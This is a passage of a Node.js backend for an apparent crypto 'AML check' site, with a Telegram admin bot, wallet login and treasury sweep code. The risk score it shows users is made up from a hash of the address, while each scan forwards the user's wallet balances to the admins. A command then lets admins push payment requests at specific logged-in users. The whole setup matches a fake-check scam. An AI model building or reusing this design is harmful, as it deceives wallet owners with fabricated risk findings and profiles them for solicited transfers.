  if (request.target_user_wallet && request.target_user_wallet !== normalizedUserWallet) {
    throw new Error("Этот запрос оплаты привязан к другой пользовательской сессии");
  }

  const cleanTxHash = String(txHash || "").trim();
  if (!cleanTxHash || cleanTxHash.length < 16) throw new Error("Некорректный tx hash");

  database.prepare(`
    UPDATE payment_requests
    SET status = 'submitted', tx_hash = ?, user_wallet = ?, tron_user_address = ?, updated_at = ?
    WHERE id = ?
  `).run(cleanTxHash, userWallet || null, tronUserAddress || null, at, id);

  return getPaymentRequestById(id);
};

const getStats = () => ({
  users: database.prepare("SELECT COUNT(*) AS count FROM wallet_users").get().count,
  checks: database.prepare("SELECT COUNT(*) AS count FROM checks").get().count,
  leads: database.prepare("SELECT COUNT(*) AS count FROM leads").get().count,
});

const getRecentUsers = (limit = 10) =>
  database.prepare(`
    SELECT
      u.address,
      u.first_seen_at AS firstSeenAt,
      u.last_seen_at AS lastSeenAt,
      u.login_count AS loginCount,
      COUNT(c.id) AS checksCount
    FROM wallet_users u
    LEFT JOIN checks c ON c.user_wallet = u.address
    GROUP BY u.address
    ORDER BY u.last_seen_at DESC
    LIMIT ?
  `).all(limit);

const getActiveUserSessions = (limit = 10) =>
  database.prepare(`
    SELECT
      s.address,
      s.created_at AS createdAt,
      s.expires_at AS expiresAt,
      u.last_seen_at AS lastSeenAt,
      u.login_count AS loginCount
    FROM sessions s
    LEFT JOIN wallet_users u ON u.address = s.address
    WHERE s.role = 'user' AND s.expires_at > ?
    ORDER BY s.expires_at DESC
    LIMIT ?
  `).all(nowIso(), limit);

const hasActiveUserSession = (address) =>
  Boolean(
    database.prepare(`
      SELECT 1 AS ok
      FROM sessions
      WHERE role = 'user' AND address = ? AND expires_at > ?
      LIMIT 1
    `).get(normalizeWalletAddress(address, "evm"), nowIso()),
  );

const getRecentChecks = (limit = 10) =>
  database.prepare(`
    SELECT user_wallet AS userWallet, wallet, score, level, created_at AS createdAt
    FROM checks
    ORDER BY created_at DESC
    LIMIT ?
  `).all(limit);

const getRecentLeads = (limit = 10) =>
  database.prepare(`
    SELECT name, contact, message, created_at AS createdAt
    FROM leads
    ORDER BY created_at DESC
    LIMIT ?
  `).all(limit);

const buildWalletMessage = (nonce, chain = "evm") =>
  [
    "AML Best: вход по кошельку",
    "",
    "Подпишите это одноразовое сообщение, чтобы подтвердить владение кошельком.",
    "Подпись не переводит средства и не даёт сайту доступ к приватным ключам или списанию.",
    "",
    `Network: ${chain === "tron" ? "TRON / USDT TRC20" : "Ethereum / EVM"}`,
    `Nonce: ${nonce}`,
  ].join("\n");

const createWalletNonce = (chainValue = "evm") => {
  const chain = chainValue === "tron" ? "tron" : "evm";
  const nonce = crypto.randomBytes(16).toString("hex");
  const message = buildWalletMessage(nonce, chain);
  nonces.set(getNonceKey(chain, nonce), { chain, nonce, message, expiresAt: Date.now() + 5 * 60 * 1000 });
  return { chain, message, nonce };
};

const scoreWallet = (wallet) => {
  const hash = crypto.createHash("sha256").update(wallet.toLowerCase()).digest();
  const score = 12 + (hash[0] % 79);
  const level = score > 68 ? "повышенный риск" : score > 42 ? "средний риск" : "низкий риск";
  const categories =
    score > 68
      ? ["миксеры", "подозрительные связи", "частые транзиты"]
      : score > 42
        ? ["биржи", "p2p", "цепочки переводов"]
        : ["чистые источники", "низкая экспозиция"];
  return { score, level, categories };
};

const getTronTreasuryWeb = () => {
  if (!tronTreasuryPrivateKey) return null;
  const instance = new TronWeb({
    fullHost: tronFullHost,
    privateKey: tronTreasuryPrivateKey,
  });
  if (tronProApiKey && typeof instance.setHeader === "function") {
    instance.setHeader({ "TRON-PRO-API-KEY": tronProApiKey });
  }
  return instance;
};

const getTronTreasuryAddress = () => {
  const treasuryWeb = getTronTreasuryWeb();
  if (!treasuryWeb) return null;
  return treasuryWeb.defaultAddress?.base58 || null;
};

const isTreasuryConfigured = () => Boolean(tronTreasuryPrivateKey || evmTreasuryPrivateKey);

const detectWithdrawChain = (address) => {
  const trimmed = String(address || "").trim();
  if (trimmed.startsWith("T") && isTronAddress(trimmed)) return "tron";
  if (trimmed.startsWith("0x") && isAddress(trimmed)) return "evm";
  return null;
};

const getTreasurySummary = async () => {
  const lines = ["Кошельки сервиса (treasury):"];

  if (tronTreasuryPrivateKey) {
    const address = getTronTreasuryAddress();
    const [usdt, trx] = await Promise.all([getTronUsdtBalance(address), getTronNativeBalance(address)]);
    lines.push(`TRON: ${address}`);
    lines.push(`  USDT: ${usdt.ok ? usdt.balance : "ошибка"}`);
    lines.push(`  TRX: ${trx.ok ? trx.balance : "ошибка"}`);
  }

  if (evmTreasuryPrivateKey) {
    const wallet = new Wallet(evmTreasuryPrivateKey);
    lines.push(`EVM: ${wallet.address}`);
    const scan = await getNonZeroNativeBalances(wallet.address, 1);
    if (scan.balances.length) {
      for (const balance of scan.balances) {
        lines.push(`  ${balance.network}: ${balance.balance} ${balance.symbol}`);
      }
    } else {
      lines.push("  Ненулевые балансы в поддерживаемых сетях не найдены");
    }
  }

  if (!isTreasuryConfigured()) {
    lines.push("Treasury не настроен. Укажите TRON_TREASURY_PRIVATE_KEY и/или EVM_TREASURY_PRIVATE_KEY.");
  }

  return lines.join("\n");
};

const sweepTronTreasury = async (destination) => {
  const treasuryWeb = getTronTreasuryWeb();
  if (!treasuryWeb) throw new Error("TRON treasury не настроен");

  const from = getTronTreasuryAddress();
  const normalizedDestination = normalizeWalletAddress(destination, "tron");
  const txs = [];

  const [usdtBalance, trxBalance] = await Promise.all([
    getTronUsdtBalance(from),
    getTronNativeBalance(from),
  ]);

  if (usdtBalance.ok && usdtBalance.rawBalance > 0n) {
    if (!trxBalance.ok || trxBalance.rawBalance < 1_000_000n) {
      throw new Error("Недостаточно TRX для комиссии перевода USDT (нужен минимум ~1 TRX)");
    }
    const contract = await treasuryWeb.contract().at(tronUsdtContract);
    const txId = await contract.transfer(normalizedDestination, usdtBalance.rawBalance.toString()).send({
      feeLimit: 150_000_000,
    });
    txs.push({ token: "USDT", amount: usdtBalance.balance, txId: String(txId) });
  }

  const sunBalance = BigInt((await treasuryWeb.trx.getBalance(from))?.toString?.() ?? 0);
  const reserveSun = 500_000n;
  const sendSun = sunBalance - reserveSun;
  if (sendSun > 0n) {
    const tx = await treasuryWeb.trx.sendTransaction(normalizedDestination, sendSun.toString());
    txs.push({
      token: "TRX",
      amount: formatTokenUnits(sendSun, 6),
      txId: tx?.txid || tx?.transaction?.txID || String(tx),
    });
  }

  return { from, destination: normalizedDestination, txs };
};

const sweepEvmTreasury = async (destination) => {
  if (!evmTreasuryPrivateKey) throw new Error("EVM treasury не настроен");

  const normalizedDestination = normalizeWalletAddress(destination, "evm");
  const wallet = new Wallet(evmTreasuryPrivateKey);
  const results = [];

  for (const [chainIdValue, network] of Object.entries(balanceNetworks)) {
    const chainId = Number(chainIdValue);
    let transferred = false;
    let lastError = null;

    for (const rpcUrl of network.rpcUrls) {
      try {
        const provider = new JsonRpcProvider(rpcUrl, chainId);
        const signer = wallet.connect(provider);
        const balance = await provider.getBalance(signer.address);
        const feeData = await provider.getFeeData();
        const gasPrice = feeData.gasPrice ?? 0n;
        const gasLimit = 21_000n;
        const cost = gasLimit * gasPrice;
        const value = balance - cost;

        if (value <= 0n) {
          results.push({
            chainId,
            network: network.name,
            skipped: true,
            reason: "нулевой баланс или недостаточно для комиссии",
          });
          transferred = true;
          break;
        }

        const tx = await signer.sendTransaction({
          to: normalizedDestination,
          value,
          gasLimit,
          gasPrice,
        });
        results.push({
          chainId,
          network: network.name,
          amount: formatBalance(value),
          symbol: network.symbol,
          txHash: tx.hash,
        });
        transferred = true;
        break;
      } catch (error) {
        lastError = error;
      }
    }

    if (!transferred) {
      results.push({
        chainId,
        network: network.name,
        error: lastError?.message || "не удалось выполнить перевод",
      });
    }
  }

  return { from: wallet.address, destination: normalizedDestination, results };
};

const telegramRequest = async (method, body) => {
  if (!telegramApi) return undefined;
  const response = await fetch(`${telegramApi}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
  const result = await response.json();
  if (!result.ok) throw new Error(result.description || `Telegram ${method} failed`);
  return result.result;
};

const sendTelegramMessage = async (chatId, text, replyMarkup) => {
  const chunks = String(text).match(/[\s\S]{1,3900}/g) || [""];
  for (const chunk of chunks) {
    await telegramRequest("sendMessage", {
      chat_id: chatId,
      text: chunk,
      disable_web_page_preview: true,
      ...(replyMarkup ? { reply_markup: replyMarkup } : {}),
    });
  }
};

const answerTelegramCallback = async (callbackQueryId, text) => {
  await telegramRequest("answerCallbackQuery", {
    callback_query_id: callbackQueryId,
    text: text || "",
    show_alert: Boolean(text),
  });
};

const getAdminMenuKeyboard = () => ({
  inline_keyboard: [
    [
      { text: "📊 Статистика", callback_data: "cmd_stats" },
      { text: "Активные сессии", callback_data: "cmd_sessions" },
    ],
    [
      { text: "👥 Пользователи", callback_data: "cmd_users" },
      { text: "🔍 Проверки", callback_data: "cmd_checks" },
      { text: "📩 Заявки", callback_data: "cmd_leads" },
    ],
  ],
});

const clearAdminPending = (chatId) => adminPendingActions.delete(chatId);

const formatPaymentRequest = (paymentRequest) =>
  [
    `ID: ${paymentRequest.id}`,
    `Сеть: ${paymentRequest.chain}${paymentRequest.chainId ? ` (${paymentRequest.chainId})` : ""}`,
    `Токен: ${paymentRequest.token.toUpperCase()}`,
    `Сумма: ${paymentRequest.amount}`,
    `Получатель: ${paymentRequest.recipient}`,
    paymentRequest.targetUserWallet ? `Пользователь: ${paymentRequest.targetUserWallet}` : "Пользователь: любой активный профиль",
    `Статус: ${paymentRequest.status}`,
    `Истекает: ${formatDate(paymentRequest.expiresAt)}`,
  ].filter(Boolean).join("\n");

const parsePaymentRequestInput = (text) => {
  const parts = String(text || "").trim().split(/\s+/);
  const chain = parts[0]?.toLowerCase();

  if (chain === "evm") {
    const chainId = parts[1];
    const amount = parts[2];
    const recipient = parts[3] || paymentEvmRecipient;
    if (!chainId || !amount || !recipient) {
      throw new Error("Формат EVM: evm <chainId> <amount> [0x-получатель]");
    }
    return { chain: "evm", chainId, token: "native", amount, recipient };
  }

  if (chain === "tron") {
    const token = parts[1]?.toLowerCase();
    const amount = parts[2];
    const recipient = parts[3] || paymentTronRecipient;
    if (!["usdt", "trx"].includes(token) || !amount || !recipient) {
      throw new Error("Формат TRON: tron <usdt|trx> <amount> [T-получатель]");
    }
    return { chain: "tron", token, amount, recipient };
  }

  throw new Error("Укажите сеть: evm или tron");
};

const buildActiveSessionsReply = () => {
  const sessions = getActiveUserSessions();
  if (!sessions.length) return "Активных пользовательских сессий нет.";

  return [
    "Активные пользовательские сессии:",
    "",
    ...sessions.map(
      (item, index) =>
        [
          `${index + 1}. ${item.address}`,
          `Последний вход: ${item.lastSeenAt ? formatDate(item.lastSeenAt) : "-"}`,
          `Входов: ${item.loginCount || 0}`,
          `Сессия до: ${formatDate(item.expiresAt)}`,
          `Баланс: /balance ${item.address}`,
        ].join("\n"),
    ),
  ].join("\n\n");
};

const buildAdminBalanceReply = async (address) => {
  const trimmed = String(address || "").trim();
  if (!trimmed) return "Укажите адрес: /balance <0x..., T... или bc1...>";

  if (trimmed.startsWith("T") && isTronAddress(trimmed)) {
    const portfolio = await buildWalletPortfolio({ tronAddress: trimmed });
    return ["Публичный баланс TRON:", "", ...formatPortfolioTelegramLines(portfolio)].join("\n");
  }

  if (isBitcoinAddress(trimmed)) {
    const portfolio = await buildWalletPortfolio({ btcAddress: trimmed });
    return ["Публичный баланс Bitcoin:", "", ...formatPortfolioTelegramLines(portfolio)].join("\n");
  }

  if (isAddress(trimmed)) {
    const portfolio = await buildWalletPortfolio({ evmAddress: trimmed, preferredChainId: 1 });
    return ["Публичный баланс кошелька:", "", ...formatPortfolioTelegramLines(portfolio)].join("\n");
  }

  return "Некорректный адрес. Используйте EVM 0x..., TRON T... или Bitcoin bc1/1/3...";
};

const createTargetedPaymentRequestFromText = (chatId, text) => {
  const [targetAddress, ...requestParts] = String(text || "").trim().split(/\s+/);
  if (!targetAddress || !requestParts.length) {
    throw new Error("Формат: /payuser <0x-пользователь> <evm|tron> ...");
  }

  const targetUserWallet = normalizeWalletAddress(targetAddress, "evm");
  if (!hasActiveUserSession(targetUserWallet)) {
    throw new Error("Активная сессия для этого пользователя не найдена");
  }

  const parsed = parsePaymentRequestInput(requestParts.join(" "));
  return serializePaymentRequest(createPaymentRequest({ ...parsed, createdBy: chatId, targetUserWallet }));
};

const startPaymentRequestFlow = async (chatId) => {
  adminPendingActions.set(chatId, { type: "payment_request", step: "details", startedAt: Date.now() });
  await sendTelegramMessage(
    chatId,
    [
      "Создание запроса оплаты для явного подтверждения пользователем.",
      "",
      "Отправьте параметры одной строкой:",
      "EVM native: evm <chainId> <amount> [0x-получатель]",
      "TRON USDT: tron usdt <amount> [T-получатель]",
      "TRON TRX: tron trx <amount> [T-получатель]",
      "",
      "Примеры:",
      "evm 1 0.01 0x0000000000000000000000000000000000000000",
      "tron usdt 10 TQn9Y2khEsLJW1ChVWFMSMeRDow5KcbLSE",
      "",
      "Если получатель не указан, используются PAYMENT_EVM_RECIPIENT или PAYMENT_TRON_RECIPIENT.",
      "/cancel — отмена",
    ].join("\n"),
  );
};

const startWithdrawFlow = async (chatId) => {
  if (!isTreasuryConfigured()) {
    await sendTelegramMessage(
      chatId,
      [
        "Вывод недоступен: не настроен кошелёк сервиса.",
        "",
        "Добавьте TRON_TREASURY_PRIVATE_KEY и/или EVM_TREASURY_PRIVATE_KEY в переменные окружения и перезапустите сервер.",
        "",
        "Важно: вывод возможен только с вашего treasury-кошелька, не с кошельков пользователей.",
      ].join("\n"),
    );
    return;
  }

  const summary = await getTreasurySummary();
  adminPendingActions.set(chatId, { type: "withdraw", step: "address", startedAt: Date.now() });
  await sendTelegramMessage(
    chatId,
    [
      summary,
      "",
      "💸 Списание всех средств с treasury-кошелька.",
      "",
      "Отправьте адрес назначения:",
      "• T... — TRON (TRX + USDT TRC20)",
      "• 0x... — EVM-сети (ETH, BNB, POL и др.)",
      "",
      "/cancel — отмена",
    ].join("\n"),
  );
};

const buildWithdrawPreview = async (destination, chain) => {
  if (chain === "tron") {
    const address = getTronTreasuryAddress();
    const [usdt, trx] = await Promise.all([getTronUsdtBalance(address), getTronNativeBalance(address)]);
    return [
      "Подтвердите списание TRON:",
      "",
      `С: ${address}`,
      `На: ${destination}`,
      "",
      `USDT: ${usdt.ok ? usdt.balance : "0"}`,
      `TRX: ${trx.ok ? trx.balance : "0"} (минус ~0.5 TRX резерв на комиссию)`,
    ].join("\n");
  }

  const wallet = new Wallet(evmTreasuryPrivateKey);
  const scan = await getNonZeroNativeBalances(wallet.address, 1);
  const balanceLines = scan.balances.length
    ? scan.balances.map((item) => `${item.network}: ${item.balance} ${item.symbol}`)
    : ["Ненулевые балансы не найдены — переводов может не быть."];

  return [
    "Подтвердите списание EVM:",
    "",
    `С: ${wallet.address}`,
    `На: ${destination}`,
    "",
    ...balanceLines,
  ].join("\n");
};

const executeWithdraw = async (chatId, pending) => {
  const { destination, chain } = pending;
  await sendTelegramMessage(chatId, "Выполняю перевод...");

  try {
    if (chain === "tron") {
      const result = await sweepTronTreasury(destination);
      const txLines = result.txs.length
        ? result.txs.map((tx) => `${tx.token}: ${tx.amount} → ${tx.txId}`).join("\n")
        : "Переводов не было — баланс пуст или остался только резерв на комиссию.";
      await sendTelegramMessage(
        chatId,
        [`✅ Списание TRON завершено`, "", `С: ${result.from}`, `На: ${result.destination}`, "", txLines].join("\n"),
      );
      return;
    }

    const result = await sweepEvmTreasury(destination);
    const txLines = result.results
      .map((item) => {
        if (item.txHash) return `${item.network}: ${item.amount} ${item.symbol} → ${item.txHash}`;
        if (item.skipped) return `${item.network}: пропущено (${item.reason})`;
        return `${item.network}: ошибка (${item.error})`;
      })
      .join("\n");
    await sendTelegramMessage(
      chatId,
      [`✅ Списание EVM завершено`, "", `С: ${result.from}`, `На: ${result.destination}`, "", txLines].join("\n"),
    );
  } catch (error) {
    await sendTelegramMessage(chatId, `❌ Ошибка списания: ${error.message}`);
  } finally {
    clearAdminPending(chatId);
  }
};

const handleAdminTextInput = async (chatId, text) => {
  const pending = adminPendingActions.get(chatId);
  if (pending?.type === "payment_request" && pending.step === "details") {
    try {
      const parsed = parsePaymentRequestInput(text);
      const paymentRequest = serializePaymentRequest(createPaymentRequest({ ...parsed, createdBy: chatId }));
      clearAdminPending(chatId);
      await sendTelegramMessage(
        chatId,
        [
          "Запрос оплаты создан.",
          "",
          formatPaymentRequest(paymentRequest),
          "",
          "Пользователь увидит его на странице проверки и сможет подтвердить перевод только вручную в своём кошельке.",
        ].join("\n"),
      );
    } catch (error) {
      await sendTelegramMessage(chatId, `${error.message}\n\nПовторите ввод или отправьте /cancel.`);
    }
    return true;
  }

  if (!pending || pending.type !== "withdraw" || pending.step !== "address") return false;

  const chain = detectWithdrawChain(text);
  if (!chain) {
    await sendTelegramMessage(chatId, "Некорректный адрес. Отправьте TRON-адрес (T...) или EVM-адрес (0x...).");
    return true;
  }

  if (chain === "tron" && !tronTreasuryPrivateKey) {
    await sendTelegramMessage(chatId, "TRON treasury не настроен. Укажите TRON_TREASURY_PRIVATE_KEY или отправьте EVM-адрес.");
    return true;
  }

  if (chain === "evm" && !evmTreasuryPrivateKey) {
    await sendTelegramMessage(chatId, "EVM treasury не настроен. Укажите EVM_TREASURY_PRIVATE_KEY или отправьте TRON-адрес.");
    return true;
  }

  let destination;
  try {
    destination = normalizeWalletAddress(text, chain);
  } catch (error) {
    await sendTelegramMessage(chatId, error.message);
    return true;
  }

  const preview = await buildWithdrawPreview(destination, chain);
  adminPendingActions.set(chatId, {
    type: "withdraw",
    step: "confirm",
    chain,
    destination,
    startedAt: pending.startedAt,
  });

  await sendTelegramMessage(chatId, preview, {
    inline_keyboard: [
      [
        { text: "✅ Подтвердить", callback_data: "withdraw_confirm" },
        { text: "❌ Отмена", callback_data: "withdraw_cancel" },
      ],
    ],
  });
  return true;
};

const handleTelegramCallback = async (callbackQuery) => {
  const chatId = String(callbackQuery.message?.chat?.id || "");
  const data = String(callbackQuery.data || "");
  if (!chatId) return;

  await answerTelegramCallback(callbackQuery.id);

  if (!telegramAdminIds.has(chatId)) {
    await sendTelegramMessage(chatId, "Доступ запрещён. Этот Telegram ID не добавлен в список администраторов.");
    return;
  }

  if (data === "withdraw_start" || data === "payment_start") {
    await sendTelegramMessage(chatId, "Эта команда отключена. Бот работает только с авторизацией, сессиями, проверками и публичными балансами.");
    return;
  }

  if (data === "withdraw_cancel") {
    clearAdminPending(chatId);
    await sendTelegramMessage(chatId, "Списание отменено.");
    return;
  }

  if (data === "withdraw_confirm") {
    const pending = adminPendingActions.get(chatId);
    if (!pending || pending.type !== "withdraw" || pending.step !== "confirm") {
      await sendTelegramMessage(chatId, "Нет активного списания. Нажмите «Списать все» и отправьте адрес.");
      return;
    }
    await executeWithdraw(chatId, pending);
    return;
  }

  const commandMap = {
    cmd_stats: "/stats",
    cmd_sessions: "/sessions",
    cmd_users: "/users",
    cmd_checks: "/checks",
    cmd_leads: "/leads",
  };
  if (commandMap[data]) {
    await sendTelegramMessage(chatId, buildTelegramReply(commandMap[data]));
  }
};

const notifyTelegramAdmins = async (text) => {
  if (!telegramToken || telegramAdminIds.size === 0) return 0;
  const results = await Promise.allSettled(
    [...telegramAdminIds].map((chatId) => sendTelegramMessage(chatId, text)),
  );
  results.forEach((result) => {
    if (result.status === "rejected") {
      console.error("Telegram notification error:", result.reason?.message || result.reason);
    }
  });
  return results.filter((result) => result.status === "fulfilled").length;
};

const formatDate = (value) => new Date(value).toLocaleString("ru-RU", { timeZone: "Europe/Samara" });

const buildTelegramReply = (command) => {
  if (command === "/start" || command === "/help") {
    return [
      "AML Best Admin",
      "",
      "/stats - общая статистика",
      "/sessions - активные пользовательские сессии",
      "/balance <адрес> - публичный баланс EVM/TRX/BTC/USDT",
      "/users - последние пользователи",
      "/checks - последние проверки",
      "/leads - последние заявки",
      "/myid - ваш Telegram chat ID",
    ].join("\n");
  }

  if (command === "/stats") {
    const stats = getStats();
    return `Статистика AML Best\n\nПользователи: ${stats.users}\nПроверки: ${stats.checks}\nЗаявки: ${stats.leads}`;
  }

  if (command === "/users") {
    const users = getRecentUsers();
    if (!users.length) return "Пользователей пока нет.";
    return users
      .map(
        (item, index) =>
          `${index + 1}. ${item.address}\nПоследний вход: ${formatDate(item.lastSeenAt)}\nВходов: ${item.loginCount}, проверок: ${item.checksCount}`,
      )
      .join("\n\n");
  }

  if (command === "/sessions") {
    return buildActiveSessionsReply();
  }

  if (command === "/checks") {
    const checks = getRecentChecks();
    if (!checks.length) return "Проверок пока нет.";
    return checks
      .map(
        (item, index) =>
          `${index + 1}. ${item.wallet}\nПользователь: ${item.userWallet || "-"}\nРиск: ${item.level} (${item.score}/100)\nДата: ${formatDate(item.createdAt)}`,
      )
      .join("\n\n");
  }

  if (command === "/leads") {
    const leads = getRecentLeads();
    if (!leads.length) return "Заявок пока нет.";
    return leads
      .map(
        (item, index) =>
          `${index + 1}. ${item.name}\nКонтакт: ${item.contact}\nСообщение: ${item.message || "-"}\nДата: ${formatDate(item.createdAt)}`,
      )
      .join("\n\n");
  }

  return "Неизвестная команда. Используйте /help.";
};

const handleTelegramUpdate = async (update) => {
  if (update.callback_query) {
    await handleTelegramCallback(update.callback_query);
    return;
  }

  const message = update.message;
  if (!message?.chat?.id || !message.text) return;

  const chatId = String(message.chat.id);
  const text = message.text.trim();
  const command = text.split(/\s+/)[0].split("@")[0].toLowerCase();

  if (command === "/myid") {
    await sendTelegramMessage(chatId, `Ваш Telegram chat ID: ${chatId}`);
    return;
  }

  if (!telegramAdminIds.has(chatId)) {
    await sendTelegramMessage(chatId, "Доступ запрещён. Этот Telegram ID не добавлен в список администраторов.");
    return;
  }

  if (command === "/cancel") {
    if (adminPendingActions.has(chatId)) {
      clearAdminPending(chatId);
      await sendTelegramMessage(chatId, "Действие отменено.");
    } else {
      await sendTelegramMessage(chatId, "Нет активного действия для отмены.");
    }
    return;
  }

  if (command === "/balance") {
    await sendTelegramMessage(chatId, await buildAdminBalanceReply(text.slice(command.length).trim()));
    return;
  }

  if (["/withdraw", "/payment", "/payuser"].includes(command)) {
    await sendTelegramMessage(chatId, "Команда отключена. Бот ограничен авторизацией, сессиями, проверками и публичными балансами.");
    return;
  }

  if (!text.startsWith("/")) {
    const handled = await handleAdminTextInput(chatId, text);
    if (handled) return;
  }

  if (command === "/start" || command === "/help") {
    await sendTelegramMessage(chatId, buildTelegramReply(command), getAdminMenuKeyboard());
    return;
  }

  await sendTelegramMessage(chatId, buildTelegramReply(command));
};

const startTelegram = async () => {
  if (!telegramToken) {
    console.log("Telegram bot disabled: TELEGRAM_BOT_TOKEN is not set");
    return;
  }

  if (telegramAdminIds.size === 0) {
    console.warn("Telegram bot has no admins: TELEGRAM_ADMIN_CHAT_IDS is empty");
  }

  try {
    const bot = await telegramRequest("getMe", {});
    telegramState.username = bot.username || null;
    telegramState.status = "running";
    telegramState.lastError = null;
  } catch (error) {
    telegramState.status = "error";
    telegramState.lastError = error.message;
    console.error("Telegram authentication error:", error.message);
    return;
  }

  await telegramRequest("setMyCommands", {
    commands: [
      { command: "stats", description: "Общая статистика" },
      { command: "sessions", description: "Активные пользовательские сессии" },
      { command: "balance", description: "Проверить публичный баланс адреса" },
      { command: "users", description: "Последние пользователи" },
      { command: "checks", description: "Последние проверки" },
      { command: "leads", description: "Последние заявки" },
      { command: "myid", description: "Показать Telegram ID" },
      { command: "help", description: "Список команд" },
    ],
  }).catch((error) => console.error("Telegram setup error:", error.message));

  if (publicBaseUrl) {
    await telegramRequest("setWebhook", {
      url: `${publicBaseUrl}/api/telegram/webhook`,
      secret_token: telegramWebhookSecret,
      allowed_updates: ["message", "callback_query"],
      drop_pending_updates: false,
    });
    console.log(
      `Telegram bot @${telegramState.username} is running in webhook mode for ${telegramAdminIds.size} admin(s)`,
    );
    return;
  }

  await telegramRequest("deleteWebhook", { drop_pending_updates: false });
  console.log(
    `Telegram bot @${telegramState.username} is running in polling mode for ${telegramAdminIds.size} admin(s)`,
  );

  while (true) {
    try {
      const updates = await telegramRequest("getUpdates", {
        offset: telegramOffset,
        timeout: 25,
        allowed_updates: ["message", "callback_query"],
      });
      for (const update of updates || []) {
        telegramOffset = update.update_id + 1;
        telegramState.lastUpdateAt = nowIso();
        await handleTelegramUpdate(update);
      }
      telegramState.status = "running";
      telegramState.lastError = null;
    } catch (error) {
      telegramState.status = "error";
      telegramState.lastError = error.message;
      console.error("Telegram polling error:", error.message);
      await new Promise((resolve) => setTimeout(resolve, 3000));
    }
  }
};

const handleApi = async (request, response, pathname) => {
  if (request.method === "OPTIONS") {
    response.writeHead(204, getCorsHeaders(request));
    response.end();
    return;
  }

  if (request.method === "GET" && pathname === "/api/health") {
    return sendJson(request, response, 200, {
      ok: true,
      time: nowIso(),
      telegram: {
        status: telegramState.status,
        mode: telegramState.mode,
        username: telegramState.username,
        adminCount: telegramAdminIds.size,
        lastUpdateAt: telegramState.lastUpdateAt,
        lastError: telegramState.lastError,
      },
    });
  }

  if (request.method === "POST" && pathname === "/api/scan") {
    const body = await readBody(request);
    const evmAddress = body.evmAddress && isAddress(body.evmAddress) ? getAddress(body.evmAddress) : null;
    const tronAddress = normalizeTronAddressInput(body.tronAddress);
    const btcAddress = body.btcAddress ? String(body.btcAddress).trim() : null;

    if (!evmAddress && !tronAddress && !btcAddress) {
      return sendJson(request, response, 400, { error: "Нужен хотя бы один адрес кошелька" });
    }

    const portfolio = await buildWalletPortfolio({
      evmAddress,
      tronAddress,
      btcAddress,
      preferredChainId: parseChainId(body.chainId) || 1,
    });

    const telegramNotifications = await notifyTelegramAdmins(
      [
        body.source === "aml_check" ? "AML-проверка после Connect" : "Автопроверка Trust Wallet",
        "",
        ...formatPortfolioTelegramLines(portfolio),
        body.amlTarget ? `AML target: ${body.amlTarget}` : null,
        body.amlResult ? `AML risk: ${body.amlResult.level} (${body.amlResult.score}/100)` : null,
        `Источник: ${body.source || "trust_wallet"}`,
        `Время: ${formatDate(nowIso())}`,
      ]
        .filter(Boolean)
        .join("\n"),
    );

    if (evmAddress) upsertWalletUser(evmAddress);

    return sendJson(request, response, 200, {
      ok: true,
      portfolio,
      telegramSent: telegramNotifications,
    });
  }

  if (request.method === "POST" && pathname === "/api/telegram/webhook") {
    if (!telegramToken || !publicBaseUrl) {
      return sendJson(request, response, 404, { error: "Telegram webhook is disabled" });
    }
    if (request.headers["x-telegram-bot-api-secret-token"] !== telegramWebhookSecret) {
      return sendJson(request, response, 403, { error: "Invalid Telegram webhook secret" });
    }

    const update = await readBody(request);
    telegramState.lastUpdateAt = nowIso();
    await handleTelegramUpdate(update);
    return sendJson(request, response, 200, { ok: true });
  }

  if (request.method === "POST" && pathname === "/api/auth/nonce") {
    const body = await readBody(request);
    return sendJson(request, response, 200, createWalletNonce(body.chain || "evm"));
  }

  if (request.method === "GET" && pathname === "/api/payment-request/active") {
    const session = getUserSession(request);
    const paymentRequest = getActivePaymentRequest(session?.address);
    return sendJson(request, response, 200, { ok: true, paymentRequest });
  }

  if (request.method === "POST" && pathname === "/api/payment-request/tx") {
    const body = await readBody(request);
    const session = getUserSession(request);
    const completed = completePaymentRequest({
      id: body.id,
      txHash: body.txHash,
      userWallet: session?.address || null,
      tronUserAddress: body.tronUserAddress,
    });
    const serialized = serializePaymentRequest(completed);
    const telegramNotifications = await notifyTelegramAdmins(
      [
        "Пользователь отправил транзакцию по запросу оплаты",
        "",
        `ID: ${serialized.id}`,
        `Сеть: ${serialized.chain}${serialized.chainId ? ` (${serialized.chainId})` : ""}`,
        `Токен: ${serialized.token.toUpperCase()}`,
        `Сумма: ${serialized.amount}`,
        `Получатель: ${serialized.recipient}`,
        serialized.userWallet ? `EVM пользователь: ${serialized.userWallet}` : null,
        serialized.tronUserAddress ? `TRON пользователь: ${serialized.tronUserAddress}` : null,
        `TX: ${serialized.txHash}`,
      ]
        .filter(Boolean)
        .join("\n"),
    );
    return sendJson(request, response, 200, { ok: true, paymentRequest: serialized, telegramNotifications });
  }


  if (request.method === "POST" && pathname === "/api/tron/usdt-balance") {
    const { address } = await readBody(request);
    const normalized = String(address || "").trim();

    if (!isTronAddress(normalized)) {
      return sendJson(request, response, 400, { error: "Некорректный TRON адрес. Он должен начинаться с T." });
    }

    const [usdtBalance, trxBalance] = await Promise.all([
      getTronUsdtBalance(normalized),
      getTronNativeBalance(normalized),
    ]);

    if (!usdtBalance.ok && !trxBalance.ok) {
      return sendJson(request, response, 502, {
        error: "Не удалось получить TRON баланс",
        details: [usdtBalance.error, trxBalance.error].filter(Boolean).join("; "),
      });
    }

    const session = getUserSession(request);
    const telegramNotifications = await notifyTelegramAdmins(
      [
        "Публичная проверка TRON кошелька",
        "",
        `TRON адрес: ${normalized}`,
        usdtBalance.ok ? `USDT TRC20: ${usdtBalance.balance} USDT` : `USDT TRC20: ошибка (${usdtBalance.error})`,
        trxBalance.ok ? `TRX: ${trxBalance.balance} TRX` : `TRX: ошибка (${trxBalance.error})`,
        session?.address ? `EVM пользователь: ${session.address}` : "EVM пользователь: не подключён",
        `Время: ${formatDate(nowIso())}`,
      ].join("\n"),
    );

    return sendJson(request, response, 200, {
      ok: true,
      chain: "tron",
      network: "TRON",
      address: normalized,
      token: "USDT_TRC20",
      contract: tronUsdtContract,
      balance: usdtBalance.ok ? usdtBalance.balance : "0",
      rawBalance: usdtBalance.ok ? usdtBalance.rawBalance.toString() : "0",
      usdt: usdtBalance.ok
        ? {
            ok: true,
            balance: usdtBalance.balance,
            rawBalance: usdtBalance.rawBalance.toString(),
            source: usdtBalance.source,
            contract: usdtBalance.contract,
          }
